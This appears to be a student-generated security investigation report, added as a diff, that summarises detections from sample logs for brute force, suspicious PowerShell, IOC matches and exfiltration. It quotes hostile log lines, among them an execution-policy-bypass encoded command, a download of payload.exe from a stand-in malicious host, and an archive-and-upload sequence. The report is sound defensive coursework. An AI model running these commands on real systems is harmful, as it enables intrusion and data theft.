@@ -1,0 +1,117 @@
+============================================================
+        SECURITY INVESTIGATION REPORT
+============================================================
+Date: 2026-11-07 15:09:40
+Tool: Security Investigation Tool v1.0
+Student: B00170627
+Module: Advanced Scripting for Cybersecurity
+============================================================
+
+------------------------------------------------------------
+EXECUTIVE SUMMARY
+------------------------------------------------------------
+
+Brute Force Attacks:      3 IPs flagged
+Suspicious PowerShell:    6 events detected
+IOC Matches:              8 matches found
+Data Exfiltration:        DETECTED
+
+Overall Risk Level:       [HIGH]
+
+============================================================
+SECTION 1: BRUTE FORCE DETECTION
+============================================================
+Source: auth.log
+Threshold: 5+ failed login attempts from same IP
+Severity: HIGH (20+), MEDIUM (10-19), LOW (5-9)
+
+[HIGH] IP: 203.0.113.77
+  Failed attempts: 25
+
+[MEDIUM] IP: 198.51.100.23
+  Failed attempts: 12
+
+[LOW] IP: 192.0.2.77
+  Failed attempts: 5
+
+============================================================
+SECTION 2: SUSPICIOUS POWERSHELL ACTIVITY
+============================================================
+Source: powershell_log.txt
+Detection: Keyword matching for known attack patterns
+
+[HIGH] Line 8 - suspicious_command
+  Matched keyword: -EncodedCommand
+  Command: 2026-03-27 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+
+[LOW] Line 11 - reconnaissance
+  Matched keyword: whoami
+  Command: 2026-03-27 10:03:01 whoami
+
+[LOW] Line 12 - reconnaissance
+  Matched keyword: ipconfig
+  Command: 2026-03-27 10:03:10 ipconfig
+
+[LOW] Line 13 - reconnaissance
+  Matched keyword: net user
+  Command: 2026-03-27 10:03:44 net user
+
+[MEDIUM] Line 16 - suspicious_command
+  Matched keyword: Invoke-WebRequest
+  Command: 2026-03-27 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious.example/payload.exe
+
+[MEDIUM] Line 22 - suspicious_command
+  Matched keyword: Invoke-WebRequest
+  Command: 2026-03-27 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+============================================================
+SECTION 3: IOC (INDICATORS OF COMPROMISE) MATCHING
+============================================================
+Source: ioc.txt cross-checked against access.log, auth.log
+
+--- Malicious IP Matches ---
+[HIGH] IP: 203.0.113.5 found in access.log (line 3)
+  Detail: 203.0.113.5 - - [27/Mar/2026:10:05:11 +0000] "GET /wp-admin HTTP/1.1" 404 209
+
+[HIGH] IP: 203.0.113.5 found in access.log (line 4)
+  Detail: 203.0.113.5 - - [27/Mar/2026:10:05:12 +0000] "GET /.env HTTP/1.1" 404 209
+
+[HIGH] IP: 198.51.100.8 found in access.log (line 7)
+  Detail: 198.51.100.8 - - [27/Mar/2026:10:09:15 +0000] "GET /config.php HTTP/1.1" 403 199
+
+[HIGH] IP: 198.51.100.8 found in auth.log (line 42)
+  Detail: Mar 27 16:30:12 web01 sshd[4202]: Failed password for ubuntu from 198.51.100.8 port 60001 ssh2
+
+--- Malicious Path Matches ---
+[HIGH] Path: /wp-admin (matched IOC: /wp-admin)
+  From IP: 203.0.113.5 in access.log (line 3)
+
+[HIGH] Path: /.env (matched IOC: /.env)
+  From IP: 203.0.113.5 in access.log (line 4)
+
+[HIGH] Path: /phpmyadmin/index.php (matched IOC: /phpmyadmin)
+  From IP: 198.51.100.99 in access.log (line 5)
+
+[HIGH] Path: /config.php (matched IOC: /config.php)
+  From IP: 198.51.100.8 in access.log (line 7)
+
+============================================================
+SECTION 4: DATA EXFILTRATION DETECTION
+============================================================
+Source: powershell_log.txt
+Detection: Archive creation followed by network upload
+
+Exfiltration Pattern: CONFIRMED
+Severity: [HIGH]
+
+Archive creation events:
+  Line 19: 2026-03-27 10:05:33 powershell.exe -Command Compress-Archive C:\Users\analyst\Documents\data.zip
+  Line 22: 2026-03-27 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+Upload/transfer events:
+  Line 16: 2026-03-27 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious.example/payload.exe
+  Line 22: 2026-03-27 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+============================================================
+END OF REPORT
+============================================================
